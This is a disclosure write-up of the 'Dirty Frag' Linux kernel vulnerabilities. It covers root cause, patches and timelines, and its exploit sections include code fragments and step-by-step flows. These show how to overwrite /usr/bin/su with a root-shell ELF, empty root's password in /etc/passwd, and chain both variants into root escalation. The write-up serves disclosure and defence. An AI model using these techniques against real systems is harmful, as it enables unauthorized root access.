<p align="center">
  <img src="tux.png" width="400" alt="tux">
</p>

# Intro

![demo](demo.gif)


For the exploit code and mitigation, [see here](../README.md).

Dirty Frag is a vulnerability (class) that achieves root privileges on most Linux distributions by chaining the xfrm-ESP Page-Cache Write vulnerability and the RxRPC Page-Cache Write vulnerability.

These vulnerabilities were first discovered and reported by [Hyunwoo Kim (@v4bel)](https://x.com/v4bel).

What both vulnerabilities have in common is that, on a zero-copy send path where `splice()` plants a reference to a page cache page that the attacker only has read access to into the `frag` slot of the sender side skb as is, the receiver side kernel code performs in-place crypto on top of that frag. As a result, the page cache of files that an unprivileged user only has read access to (such as `/etc/passwd` or `/usr/bin/su`) is modified in RAM, and every subsequent read sees the modified copy.

This article analyzes the root cause and the exploit flow of the two vulnerabilities, and then explains how chaining covers the blind spots of the two vulnerabilities.

# Background

Dirty Frag belongs to the same class as [Dirty Pipe](https://dirtypipe.cm4all.com/) and [Copy Fail](https://copy.fail/). However, while Dirty Pipe overwrites `struct pipe_buffer`, Dirty Frag overwrites the `frag` of `struct sk_buff`.

In Copy Fail, the attacker uses `splice(file -> pipe -> AF_ALG_fd)` to plant an attacker-pinned page cache page into the TX SGL. Inside `recv()`, the last 4 bytes (tag) of the TX SGL are detached into `areq->tsgl` and chained to the end of the RX SGL via `sg_chain`. The `aead_request_set_crypt(req, src=RX, dst=RX)` call decides in-place mode, and `scatterwalk_map_and_copy(tmp+1, dst, assoclen+cryptlen, 4, 1)` performs a scratch write of 4 bytes of `seqno_lo` to the end of dst as part of byte rearrangement. On a normal IPsec path, that location is the skb's tag area, so the write is harmless. However, when an attacker-pinned page is placed at that location, the assumption breaks.

Dirty Frag is a vulnerability where the same pattern is reproduced on top of the frag of a nonlinear skb that originated from splice.

- xfrm-ESP Page-Cache Write: `esp_input` bypasses `skb_cow_data` and runs `crypto_authenc_esn_decrypt` directly on top of the frag.
- RxRPC Page-Cache Write: `rxkad_verify_packet_1` performs an in-place single-block decrypt with `pcbc(fcrypt)` on top of the frag.

Note that Dirty Frag can be triggered regardless of whether the `algif_aead` module is available. In other words, even on systems where the publicly known Copy Fail mitigation (algif_aead blacklist) is applied, your Linux is still vulnerable to Dirty Frag.

# CVE-2026-43284: xfrm-ESP Page-Cache Write

## Root Cause

Before performing in-place AEAD decryption on the ESP payload, `esp_input()` should allocate a new kernel-private buffer with `skb_cow_data()` when the skb is non-linear, copy the frag data into it, and then perform the in-place operation. However, the following branch creates a path that bypasses that cow.

```c
static int esp_input(struct xfrm_state *x, struct sk_buff *skb)
{
        [...]

        if (!skb_cloned(skb)) {
                if (!skb_is_nonlinear(skb)) {    // <=[1]
                        nfrags = 1;

                        goto skip_cow;
                } else if (!skb_has_frag_list(skb)) {
                        nfrags = skb_shinfo(skb)->nr_frags;
                        nfrags++;

                        goto skip_cow;           // <=[2]
                }
        }

        err = skb_cow_data(skb, 0, &trailer);

        [...]
```

At `[1]`, even when the skb has a frag, if `frag_list` is absent the code jumps directly to `[2]` and performs in-place crypto on top of the frag. If the attacker has pinned a page cache page into the frag through `splice`, that page becomes both `src` and `dst`.

The issue is not in-place crypto itself, but the fact that in-place crypto causes a STORE. With the ESP + ESN + `authencesn(...)` combination, `crypto_authenc_esn_decrypt()` performs the following STORE during the preprocessing step that moves the high-order 4 bytes of the sequence number to the end of the src SGL.

```c
static int crypto_authenc_esn_decrypt(struct aead_request *req)
{
        [...]

        /* Move high-order bits of sequence number to the end. */
        scatterwalk_map_and_copy(tmp, src, 0, 8, 0);
        if (src == dst) {
                scatterwalk_map_and_copy(tmp, dst, 4, 4, 1);
                scatterwalk_map_and_copy(tmp + 1, dst, assoclen + cryptlen, 4, 1);   // <=[3]
                dst = scatterwalk_ffwd(areq_ctx->dst, dst, 4);
        [...]
```

The 4-byte STORE at `[3]` happens at the `assoclen + cryptlen` position of the dst SGL. If the attacker tunes the payload length so that page P, planted via splice, occupies that position, the 4 bytes are STOREd at exactly the desired file offset of page P.

The value of these 4 bytes is the data pointed to by `tmp + 1`, that is, the high-order 32 bits of the sequence number in the ESP header. Tracing where this value comes from, `esp_input_set_header()` simply copies the SA's `XFRM_SKB_CB(skb)->seq.input.hi` into place, and that value is `replay_esn->seq_hi`, which the user freely specified at SA registration time via the `XFRMA_REPLAY_ESN_VAL` netlink attribute.

```c
static void esp_input_set_header(struct sk_buff *skb, __be32 *seqhi)
{
        struct xfrm_state *x = xfrm_input_state(skb);
        struct ip_esp_hdr *esph;

        /* For ESN we move the header forward by 4 bytes to
         * accommodate the high bits.  We will move it back after
         * decryption.
         */
        if ((x->props.flags & XFRM_STATE_ESN)) {
                esph = skb_push(skb, 4);
                *seqhi = esph->spi;
                esph->spi = esph->seq_no;
                esph->seq_no = XFRM_SKB_CB(skb)->seq.input.hi;
        }
}
```

Therefore, the attacker can control both the location (file offset) and the value (4 bytes) of the STORE. AEAD authentication verification runs after the STORE, so even when authentication fails the STORE has already happened and the page cache modification persists permanently. In other words, the attacker succeeds in modification without knowing the SA's authentication key.

In addition, for `esp_input` to be invoked, an XFRM SA must be registered, which requires `CAP_NET_ADMIN`. That means the attacker needs the privilege to create a user namespace.

## Exploit

The target is `/usr/bin/su`. The first 192 bytes (starting from file offset 0) of the page cache of `/usr/bin/su`, whose setuid-root bit is intact, are entirely replaced with a static root-shell ELF. The new ELF maps `0xb8` bytes at vaddr `0x400000` as R+X via PT_LOAD, and at the entry point `0x400078` (file offset `0x78`) it runs `setgid(0); setuid(0); setgroups(0,NULL); execve("/bin/sh", NULL, ["TERM=xterm",NULL])`. The PAM flow is bypassed entirely, and a single `execve("/usr/bin/su")` is enough to obtain a root shell. The 192 bytes are split into 48 chunks of 4 bytes each, and they are written via the 4-byte arbitrary STORE primitive of the ESP variant.

XFRM SA registration requires `CAP_NET_ADMIN`, so the child process is isolated inside a new user/net namespace via `unshare(CLONE_NEWUSER | CLONE_NEWNET)` and gains root inside that namespace. The mapping uses an identity mapping (`0 <real_uid> 1`), and `lo` of the new netns is brought UP via `ioctl(SIOCSIFFLAGS)`.

```c
unshare(CLONE_NEWUSER | CLONE_NEWNET);
write_proc("/proc/self/setgroups", "deny");
write_proc("/proc/self/uid_map", "0 <real_uid> 1");
write_proc("/proc/self/gid_map", "0 <real_gid> 1");
ioctl(s, SIOCSIFFLAGS, &(struct ifreq){ .ifr_name="lo",
                                        .ifr_flags=IFF_UP|IFF_RUNNING });
```

Next, 48 chunks worth of XFRM SAs are registered at once. Each SA has a separate SPI (`0xDEADBE10 + i`), and the 4 bytes (`= shellcode[i*4..(i+1)*4]`) placed in `XFRMA_REPLAY_ESN_VAL.seq_hi` are exactly the value that will be STOREd into the page cache. The body of the SA is filled with `XFRM_MODE_TRANSPORT + XFRM_STATE_ESN`, the algorithm `authencesn(hmac(sha256), cbc(aes))`, UDP-encap (sport=dport=4500), the replay state `{bmp_len=1, seq=100, replay_window=32}`, and src/daddr `127.0.0.1`. The HMAC key (32 bytes) and the cipher key (16 bytes) are arbitrary values, since the authentication and decryption verification will fail anyway.

```c
struct xfrm_replay_state_esn esn = {
    .bmp_len = 1, .seq = 100, .replay_window = 32,
    .seq_hi = patch_seqhi,        /* The 4 bytes that will be STOREd */
};
put_attr(nlh, XFRMA_REPLAY_ESN_VAL, &esn, sizeof(esn) + 4);
```

Each chunk's trigger uses a freshly created pair of sk_recv (`bind 127.0.0.1:4500` + `setsockopt(SOL_UDP, UDP_ENCAP, UDP_ENCAP_ESPINUDP)`) and sk_send (`connect 127.0.0.1:4500`). UDP packets that arrive on sk_recv (which has `UDP_ENCAP_ESPINUDP` set) are not dispatched to the regular UDP queue inside `udp_queue_rcv_one_skb` but are routed to `xfrm4_udp_encap_rcv -> xfrm_input -> esp_input` instead. The body of the trigger registers a forged ESP wire header (SPI 4 + seq_no_lo 4 + IV 16 = 24 bytes, with the IV filled with `0xCC`) into a pipe with `vmsplice`, then registers 16 bytes from file offset `i*4` of `/usr/bin/su` into the next pipe slot via `splice`, and finally sends `pipe -> sk_send` through a single `splice` call. With `splice_to_socket()` automatically setting `MSG_SPLICE_PAGES`, the page cache page P of `/usr/bin/su` is planted as is into `frag[0]` of the sender skb.

```c
uint8_t hdr[24];
*(uint32_t *)(hdr + 0) = htonl(spi);          /* per-chunk SPI */
*(uint32_t *)(hdr + 4) = htonl(SEQ_VAL);      /* wire seq_no_lo */
memset(hdr + 8, 0xCC, 16);                    /* IV (value irrelevant) */

vmsplice(pfd[1], &(struct iovec){hdr, 24}, 1, 0);
splice(file_fd, &(off_t){i*4}, pfd[1], NULL, 16, SPLICE_F_MOVE);
splice(pfd[0], NULL, sk_send, NULL, 24 + 16, SPLICE_F_MOVE);
```

The sender skb is RX'd over loopback in the following shape.

```
skb {
    head/linear: ESP_hdr(8) + IV(16)               // 24 byte
    frags[0]:    { page=&P, off=i*4, size=16 }     // page cache page of /usr/bin/su
}
```

The receiver side branch is as follows.

```
udp_rcv(skb) 
  xfrm4_udp_encap_rcv(sk, skb)
    xfrm_input(skb, IPPROTO_ESP, spi, 0)
      esp_input(x, skb) 
        pskb_may_pull(skb, sizeof(esp_hdr) + ivlen) 
        if (!skb_cloned(skb) && !skb_has_frag_list(skb))      // Vulnerable branch: frag(page=P) preserved
          goto skip_cow;
        esp_input_set_header(skb, seqhi)
          skb_push(skb, 4);
          esph->seq_no = XFRM_SKB_CB(skb)->seq.input.hi;
        skb_to_sgvec(skb, sg, 0, skb->len)
        aead_request_set_crypt(req, sg, sg, elen+ivlen, iv)
        crypto_aead_decrypt(req)
          crypto_authenc_esn_decrypt(req)
            scatterwalk_map_and_copy(tmp+1, dst, assoclen+cryptlen, 4, /*out=*/1)
              memcpy(page_address(P) + i*4, &tmp[1], 4);      // 4 byte STORE: page P[i*4..i*4+3] = patch_seqhi
```

A single call STOREs exactly 4 bytes at file offset `i*4`. The AEAD authentication result is `-EBADMSG`, but since the STORE has already happened before that, the error is ignored.

By cycling i over 0..47, the 192-byte ELF is fully assembled on top of the page cache. There is no need for lock-stepping, so the operation is deterministic, and once a page cache has been STOREd it is preserved until `drop_caches` or reboot. When the parent process (init userns) execs `/usr/bin/su -` along with a PTY, the modified copy is mapped into the new process. After elevation to euid=0 by the setuid-root bit, the shellcode at entry `0x400078` runs, and `/bin/sh` ends up running with root privileges.

## Patch

The [patch](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e62ab75f1d5cdd191dd5f9c77fdff4) sets the `SKBFL_SHARED_FRAG` flag on page frags that came in via `splice` in the IPv4/IPv6 datagram append paths, and in the skip_cow branch of ESP input (`esp_input` / `esp6_input`) it checks this flag so that an skb with externally pinned pages is always routed to the `skb_cow_data` path. As a result, attacker-pinned page cache pages can no longer enter the dst SGL of the in-place AEAD, and page cache modification is blocked.

```diff
diff --git a/net/ipv4/esp4.c b/net/ipv4/esp4.c
index 6dfc0bcde..6a5febbdb 100644
--- a/net/ipv4/esp4.c
+++ b/net/ipv4/esp4.c
@@ -873,7 +873,8 @@ static int esp_input(struct xfrm_state *x, struct sk_buff *skb)
 			nfrags = 1;
 
 			goto skip_cow;
-		} else if (!skb_has_frag_list(skb)) {
+		} else if (!skb_has_frag_list(skb) &&
+			   !skb_has_shared_frag(skb)) {
 			nfrags = skb_shinfo(skb)->nr_frags;
 			nfrags++;
 
diff --git a/net/ipv4/ip_output.c b/net/ipv4/ip_output.c
index e4790cc7b..5bcd73cbd 100644
--- a/net/ipv4/ip_output.c
+++ b/net/ipv4/ip_output.c
@@ -1233,6 +1233,8 @@ static int __ip_append_data(struct sock *sk,
 			if (err < 0)
 				goto error;
 			copy = err;
+			if (!(flags & MSG_NO_SHARED_FRAGS))
+				skb_shinfo(skb)->flags |= SKBFL_SHARED_FRAG;
 			wmem_alloc_delta += copy;
 		} else if (!zc) {
 			int i = skb_shinfo(skb)->nr_frags;
diff --git a/net/ipv6/esp6.c b/net/ipv6/esp6.c
index 9f7531373..9c06c5a14 100644
--- a/net/ipv6/esp6.c
+++ b/net/ipv6/esp6.c
@@ -915,7 +915,8 @@ static int esp6_input(struct xfrm_state *x, struct sk_buff *skb)
 			nfrags = 1;
 
 			goto skip_cow;
-		} else if (!skb_has_frag_list(skb)) {
+		} else if (!skb_has_frag_list(skb) &&
+			   !skb_has_shared_frag(skb)) {
 			nfrags = skb_shinfo(skb)->nr_frags;
 			nfrags++;
 
diff --git a/net/ipv6/ip6_output.c b/net/ipv6/ip6_output.c
index 7e92909ab..1f2a33fbe 100644
--- a/net/ipv6/ip6_output.c
+++ b/net/ipv6/ip6_output.c
@@ -1794,6 +1794,8 @@ static int __ip6_append_data(struct sock *sk,
 			if (err < 0)
 				goto error;
 			copy = err;
+			if (!(flags & MSG_NO_SHARED_FRAGS))
+				skb_shinfo(skb)->flags |= SKBFL_SHARED_FRAG;
 			wmem_alloc_delta += copy;
 		} else if (!zc) {
 			int i = skb_shinfo(skb)->nr_frags;
```

My v1 patch took the approach of calling `skb_cow_data()` directly in the input fast path of esp4/esp6. The final merged patch is based on the shared-frag approach that Kuan-Ting Chen submitted as a follow-up four days after my patch was published, and I would like to thank him for writing the patch.

## Disclosure Timeline

- 2026-04-30: Submitted detailed information about the esp vulnerability and a weaponized exploit that achieves root privileges on several major distributions to security@kernel.org.
- 2026-04-30: Submitted the [patch](https://lore.kernel.org/all/afLDKSvAvMwGh7Fy@v4bel/) for the esp vulnerability to the netdev mailing list. Information about this issue was published publicly.
- 2026-04-30 (+9h): Kuan-Ting Chen submitted a vulnerability report for the esp vulnerability with a reproducer to security@kernel.org.
- 2026-05-04: Kuan-Ting Chen submitted the [shared-frag approach patch](https://lore.kernel.org/all/20260504073403.38854-1-h3xrabbit@gmail.com/) to the netdev mailing list.
- 2026-05-07: The patch was [merged](https://git.kernel.org/pub/scm/linux/kernel/git/netdev/net.git/commit/?id=f4c50a4034e62ab75f1d5cdd191dd5f9c77fdff4) into the netdev tree.
- 2026-05-07: Submitted detailed information about the vulnerability and the exploit to the linux-distros mailing list. The embargo was set to 5 days, with an agreement that if a third party publishes the exploit on the internet during the embargo period, the Dirty Frag exploit would be published publicly.
- 2026-05-07: Detailed information and the exploit for this vulnerability were published publicly by an unrelated third party, breaking the embargo.
- 2026-05-07: After obtaining agreement from distribution maintainers to fully disclose Dirty Frag, the entire Dirty Frag document was published.
- 2026-05-08: The [f4c50a4034e6](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e62ab75f1d5cdd191dd5f9c77fdff4) patch was merged into mainline.
- 2026-05-08: This vulnerability was assigned CVE-2026-43284.

# CVE-2026-43500: RxRPC Page-Cache Write

## Root Cause

To verify a data packet at the `RXRPC_SECURITY_AUTH` level of the RXKAD security class, `rxkad_verify_packet_1()` performs an in-place `pcbc(fcrypt)` decryption on the first 8 bytes of the rxrpc payload of the skb.

```c
static int rxkad_verify_packet_1(struct rxrpc_call *call, struct sk_buff *skb,
                                 rxrpc_seq_t seq,
                                 struct skcipher_request *req)
{

        [...]

        /* Decrypt the skbuff in-place.  TODO: We really want to decrypt
         * directly into the target buffer.
         */
        sg_init_table(sg, ARRAY_SIZE(sg));
        ret = skb_to_sgvec(skb, sg, sp->offset, 8);
        if (unlikely(ret < 0))
                return ret;

        /* start the decryption afresh */
        memset(&iv, 0, sizeof(iv));

        skcipher_request_set_sync_tfm(req, call->conn->rxkad.cipher);
        skcipher_request_set_callback(req, 0, NULL, NULL);
        skcipher_request_set_crypt(req, sg, sg, 8, iv.x);     // <=[4]
        ret = crypto_skcipher_decrypt(req);                   // <=[5]
```

At `[4]`, the src and dst SGLs are the same (`sg, sg`), making this in-place. Since `skb_to_sgvec()` converts the skb's frag directly into the SGL, page cache page P that the attacker pinned into the frag via `splice` becomes the src/dst SGL as is. At `[5]`, an 8-byte STORE happens on top of P.

The difference from xfrm-ESP Page-Cache Write is that the value of the STORE is not the 4 bytes that the attacker controls directly, but 8 bytes that have gone through the cipher function once with the attacker's key K. Since the IV is 0 and the block is single, `pcbc_decrypt(C, K, IV=0)` is equivalent to a single `fcrypt_decrypt(C, K)`. In other words, the 8 bytes that get STOREd are the result of `fcrypt_decrypt(C, K)`, and the attacker can keep changing K and brute force in user-space until the desired 8-byte plaintext drops out.

`fcrypt` is an Andrew File System dedicated cipher with a 56-bit key and an 8-byte block. Because it is a deterministic function, it can be ported to user-space.

The K used by the cipher tfm comes from the session_key field of an RxRPC v1 token registered via `add_key("rxrpc", desc, payload, ..., KEY_SPEC_PROCESS_KEYRING)`. Registering an RxRPC key requires no privilege, so an unprivileged user can freely control K.

Unlike xfrm-ESP Page-Cache Write, this vulnerability can be triggered without the privilege to create a user namespace.

## Exploit

Unlike the ESP variant, which directly STOREs an arbitrary 4 bytes into the page cache via the SA's `seq_hi`, the STORE value of the RxRPC variant is `fcrypt_decrypt(C, K)`, the result of running the cipher function once with the key K placed by the attacker, and the attacker cannot choose it directly. To plant a desired 8 bytes, K such that this value drops out has to be brute forced in user-space, and the cost grows exponentially with the number of constrained plaintext bytes (when all 8 bytes are constrained, the key space reaches `~2⁵⁶`, which is practically infeasible). For that reason, the ESP-style approach of writing a static 192-byte ELF as a whole into the `/usr/bin/su` page cache is impractical, and instead a target with very few bytes that need to be decided must be chosen.

The target of this variant is line 1 (the root entry) of `/etc/passwd`. The normal line starts with `"root:x:0:0:root:/root:/bin/bash"`, and the exploit replaces chars 4..15 with last-write-wins into the shape `"::0:0:GGGGGG:"`, making the final line 1 `"root::0:0:GGGGGG:/root:/bin/bash"`. That is, the passwd field becomes an empty string, and `pam_unix.so nullok` of PAM common-auth accepts this and returns `PAM_SUCCESS` without a prompt. Only 12 bytes (chars 4..15) need to be decided, and among them the 5 bytes at chars 10..14 only carry the weak constraint of "anything other than colon, newline, or null", so the brute force cost falls into a realistic range. Since one 8-byte STORE alone cannot easily reshape line 1, the design uses last-write-wins across three positions.

```
file offset:  0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ...
original:     r o o t : x : 0 : 0  :  r  o  o  t  :  ...

splice A @ 4, 8B → 4..11 = P_A[0..7]   want chars 4..5 = "::"
splice B @ 6, 8B → 6..13 = P_B[0..7]   want chars 6..7 = "0:"  (overwrites chars 6..11)
splice C @ 8, 8B → 8..15 = P_C[0..7]   want chars 8..9 = "0:" / 15 = ":" /
                                            10..14 ≠ ':' '\\0' '\\n'
→ "root::0:0:GGGGGG:..."
```

Each 8-byte STORE is `fcrypt_decrypt(C, K)`. `pcbc(fcrypt)` reduces to a single fcrypt decrypt at single block + IV=0, where `C` is the 8-byte ciphertext that actually exists at that position right before the STORE, and `K` is the 8-byte session_key that we plant in the RxRPC key. Therefore, by rotating `K` in user-space, the exploit brute forces until `fcrypt_decrypt(C, K)` produces the desired plaintext pattern.

The exploit opens `/etc/passwd` RO and pins the first page with mmap. After reading the ciphertexts `Ca`/`Cb`/`Cc` at file offsets 4/6/8 with `pread`, it searches for K_A/K_B/K_C using a user-space port of kernel `crypto/fcrypt.c` (~18 M/s; about ~5 ms each for K_A/K_B and ~1 s for K_C). The key point is that, after splice A is applied, the ciphertext that splice B sees is no longer the original. Because splice A has already replaced file offset 4..11 with P_A, the first 6 bytes of the 8 bytes that splice B sees at 6..13 are `P_A[2..7]`, and only the last 2 bytes are the original `C_b[6..7]`. By the same logic, the ciphertext that splice C sees is `P_B[2..7] || C_c[6..7]`. This chained-ciphertext correction must be reflected in the brute force step so that, after the actual STORE, line 1 lands in the intended shape.

```c
find_K(Ca, /*pred*/ check_pa, &Ka, &Pa);                    /* "::"  */
memcpy(Cb_actual, Pa+2, 6); memcpy(Cb_actual+6, Cb+6, 2);
find_K(Cb_actual, check_pb, &Kb, &Pb);                      /* "0:"  */
memcpy(Cc_actual, Pb+2, 6); memcpy(Cc_actual+6, Cc+6, 2);
find_K(Cc_actual, check_pc, &Kc, &Pc);                      /* "0:GGGGGG:" */
```

Once K_A/K_B/K_C are determined, a kernel trigger is run once at each of the three positions in turn. First, a single dummy `socket(AF_RXRPC, ...)` autoloads `rxrpc.ko` (thanks to `MODULE_ALIAS_NETPROTO(PF_RXRPC)`). For each trigger, with a separate description (`"evil0"`, `"evil1"`, `"evil2"`), an RxRPC v1 token (XDR, sec_ix=2 RXKAD, 8 bytes K placed in the session_key slot) is built and `add_key("rxrpc", desc, ..., KEY_SPEC_PROCESS_KEYRING)` is called.

```c
build_rxrpc_v1_token(buf, K);   /* session_key=K */
syscall(SYS_add_key, "rxrpc", desc, buf, n, KEY_SPEC_PROCESS_KEYRING);
```

Next, a pair of a plain UDP socket (`udp_srv` @ port_S) playing the role of a fake server and an AF_RXRPC client (`rxsk_cli` @ port_C) is created in the same process. The client is bound to the key above with `setsockopt(SOL_RXRPC, RXRPC_SECURITY_KEY, desc)`, and the security level is forced with `RXRPC_MIN_SECURITY_LEVEL = RXRPC_SECURITY_AUTH (1)`. When the client initiates an RPC call with `sendmsg`, the fake server extracts `(epoch, cid, callNumber)` from the first packet and sends a forged `CHALLENGE` (type=6, version=2, nonce=`0xDEADBEEF`, min_level=1) to the client.

```c
struct {
    struct rxrpc_wire_header hdr;
    struct rxkad_challenge   ch;
} __attribute__((packed)) c = {0};
c.hdr.type = RXRPC_PACKET_TYPE_CHALLENGE; c.hdr.securityIndex = 2;
c.hdr.epoch = htonl(epoch); c.hdr.cid = htonl(cid);
c.ch.version = htonl(2); c.ch.nonce = htonl(0xDEADBEEFu); c.ch.min_level = htonl(1);
sendto(udp_srv, &c, sizeof(c), 0, /*client*/, ...);
```

Upon receiving the CHALLENGE, the client automatically generates and sends a RESPONSE with K, and at the same time initializes the connection security context with `conn->rxkad.cipher = pcbc(fcrypt) + setkey(K)`. The fake server has no real ticket to verify, so it drains the RESPONSE and ignores it. From this point on, the client believes that a secure connection protected by K has been established.

Next, the wire `cksum` of the forged DATA packet must be precomputed with K. Only after passing the cksum verification of `rxkad_verify_packet` does the flow reach the in-place decrypt of `rxkad_verify_packet_1`. Both stages of the cksum are computed using a user-space `pcbc(fcrypt)` (`socket(AF_ALG)` + `bind("skcipher", "pcbc(fcrypt)")` + `setkey(K)`). First, `csum_iv` is derived from the latter 8 bytes of the output of `PCBC-encrypt({htonl(epoch), htonl(cid), 0, htonl(sec_ix=2)}, IV=K)`. Then, the wire cksum is derived from the upper 16 bits of word 1 (1 if the value is 0) of the output of `PCBC-encrypt({htonl(call_id), htonl((cid&3)<<30 | (seq&0x3fffffff))}, IV=csum_iv)`.

```c
compute_csum_iv(epoch, cid, /*sec_ix=*/2, K, csum_iv);
compute_cksum(cid, callN, /*seq=*/1, K, csum_iv, &cksum_h);

struct rxrpc_wire_header mal = {
    .type = RXRPC_PACKET_TYPE_DATA, .flags = RXRPC_LAST_PACKET, .securityIndex = 2,
    .epoch = htonl(epoch), .cid = htonl(cid), .callNumber = htonl(callN),
    .seq = htonl(1), .cksum = htons(cksum_h), .serviceId = htons(svc_id),
};
```

The forged DATA wire header (28 bytes) and 8 bytes of `/etc/passwd` are sent from `udp_srv` to the client using the same vmsplice + 2× splice pattern as the ESP variant. With `splice_to_socket()` automatically setting `MSG_SPLICE_PAGES`, page cache page P of `/etc/passwd` is planted as is into the frag of the sender skb.

```c
int p[2]; pipe(p);
vmsplice(p[1], &(struct iovec){&mal, sizeof(mal)}, 1, 0);
splice(passwd_fd, &(loff_t){splice_off}, p[1], NULL, 8, SPLICE_F_NONBLOCK);
connect(udp_srv, /*client*/, ...);
splice(p[0], NULL, udp_srv, NULL, sizeof(mal) + 8, 0);
```

This packet is enqueued into the client's `local->rx_queue` via loopback, and the skb that the io_thread / call worker dequeues reaches the verify path on a single `recvmsg` call (because `skb_cloned(skb)` at `call_event.c:337` is false, no unshare happens).

```
recvmsg(rxsk_cli, &m, 0)
  rxrpc_recvmsg(sock, msg, ...)
    rxrpc_recvmsg_data(sock, call, msg, ...)
      rxrpc_verify_data(call, skb)
        rxkad_verify_packet(call, skb)
          rxkad_verify_packet_1(call, skb, seq, req)
            skb_to_sgvec(skb, sg, sp->offset=28, 8)
            memset(&iv, 0, sizeof(iv));
            skcipher_request_set_crypt(req, sg, sg, 8, iv.x)      // src=dst (in-place)
            crypto_skcipher_decrypt(req)
              crypto_pcbc_decrypt(req)
                fcrypt_decrypt(page_address(P) + splice_off, ct, K)  // 8 byte STORE: page P[splice_off..+8] = fcrypt_decrypt(C, K)
```

Each STORE plants exactly 8 bytes at file offset (`splice_off`). The sechdr verification afterward returns `-EPROTO`, but the STORE is already done.

For each of the three positions (off = 4, 6, 8), the exploit runs the following sequence in turn: update K, `add_key`, socket setup, handshake, cksum computation, splice + recvmsg. With last-write-wins, chars 4..15 of `/etc/passwd` line 1 are replaced with the shape `"::0:0:GGGGGG:"`. Finally, when the parent process execs `/usr/bin/su -` along with a PTY, `pam_unix.so nullok` of PAM common-auth accepts the empty passwd field and lets it through without a prompt. su then performs `setresuid(0, 0, 0)` and execs `/bin/bash`, dropping into a root shell. This variant does not use `unshare()`, and `add_key()`, `socket(AF_RXRPC)`, `socket(AF_ALG)` (for cksum computation), `splice()`, and `recvmsg()` are all APIs available to unprivileged users.

## Patch

The [patch](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=aa54b1d27fe0c2b78e664a34fd0fdf7cd1960d71) extends the gate before in-place decryption from a single `skb_cloned(skb)` check to also catch `skb_has_frag_list(skb) || skb_has_shared_frag(skb)`, so that skbs carrying a chained frag list or externally-shared paged frags are isolated via `skb_copy()` instead of reaching the decrypt sink directly.

```diff
diff --git a/net/rxrpc/call_event.c b/net/rxrpc/call_event.c
index fdd683261226..2b19b252225e 100644
--- a/net/rxrpc/call_event.c
+++ b/net/rxrpc/call_event.c
@@ -334,7 +334,9 @@ bool rxrpc_input_call_event(struct rxrpc_call *call)

 			if (sp->hdr.type == RXRPC_PACKET_TYPE_DATA &&
 			    sp->hdr.securityIndex != 0 &&
-			    skb_cloned(skb)) {
+			    (skb_cloned(skb) ||
+			     skb_has_frag_list(skb) ||
+			     skb_has_shared_frag(skb))) {
 				/* Unshare the packet so that it can be
 				 * modified by in-place decryption.
 				 */
diff --git a/net/rxrpc/conn_event.c b/net/rxrpc/conn_event.c
index a2130d25aaa9..442414d90ba1 100644
--- a/net/rxrpc/conn_event.c
+++ b/net/rxrpc/conn_event.c
@@ -245,7 +245,8 @@ static int rxrpc_verify_response(struct rxrpc_connection *conn,
 {
 	int ret;

-	if (skb_cloned(skb)) {
+	if (skb_cloned(skb) || skb_has_frag_list(skb) ||
+	    skb_has_shared_frag(skb)) {
 		/* Copy the packet if shared so that we can do in-place
 		 * decryption.
 		 */
```

## Disclosure Timeline

- 2026-04-29: Submitted detailed information about the rxrpc vulnerability and a weaponized exploit that achieves root privileges on Ubuntu to security@kernel.org.
- 2026-04-29: Submitted the [patch](https://lore.kernel.org/all/afKV2zGR6rrelPC7@v4bel/) for the rxrpc vulnerability to the netdev mailing list. Information about this issue was published publicly.
- 2026-05-07: Submitted detailed information about the vulnerability and the exploit to the linux-distros mailing list. The embargo was set to 5 days, with an agreement that if a third party publishes the exploit on the internet during the embargo period, the Dirty Frag exploit would be published publicly.
- 2026-05-07: Detailed information and the exploit for the esp vulnerability were published publicly by an unrelated third party, breaking the embargo.
- 2026-05-07: After obtaining agreement from distribution maintainers to fully disclose Dirty Frag, the entire Dirty Frag document was published.
- 2026-05-08: CVE-2026-43500 was reserved for tracking this vulnerability.
- 2026-05-10: The [aa54b1d27fe0](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=aa54b1d27fe0c2b78e664a34fd0fdf7cd1960d71) patch was merged into mainline.

# Chaining

xfrm-ESP Page-Cache Write provides a powerful arbitrary 4-byte STORE primitive like Copy Fail, and is included on most distributions. However, it requires the privilege to create a namespace (`unshare(CLONE_NEWUSER)`). Ubuntu sometimes blocks unprivileged user namespace creation through AppArmor policy. In such an environment, xfrm-ESP Page-Cache Write cannot be triggered.

RxRPC Page-Cache Write does not require the privilege to create a namespace, but the `rxrpc.ko` module itself is not included in most distributions. For example, the default build of RHEL 10.1 does not ship `rxrpc.ko`. However, on Ubuntu, the `rxrpc.ko` module is loaded by default.

Chaining the two variants makes the blind spots cover each other. In an environment where user namespace creation is allowed, the ESP exploit runs first. Conversely, on Ubuntu where user namespace creation is blocked but `rxrpc.ko` is built, the RxRPC exploit works.

The chain exploit proceeds as follows.

```
1. Try the ESP variant in a child process:
     unshare(USER|NET) → register XFRM SA → splice → modify /usr/bin/su

2. Check whether the first byte of the shellcode has been planted at the entry offset of /usr/bin/su.
   On modification success → parent process performs forkpty + execve("/usr/bin/su") → root shell.

3. On modification failure (e.g. unshare(USER) returns -EPERM, or esp4.ko is not loaded, or SA registration fails):
     Fall back to the RxRPC variant:
     /etc/passwd line 1 K search → three splice triggers → passwd field empty
     forkpty + execve("/usr/bin/su") → PAM nullok → root shell.
```

Thanks to the flow above, a single exploit binary works across major distributions. Even if one variant is blocked by environmental policy, the other fills the gap.
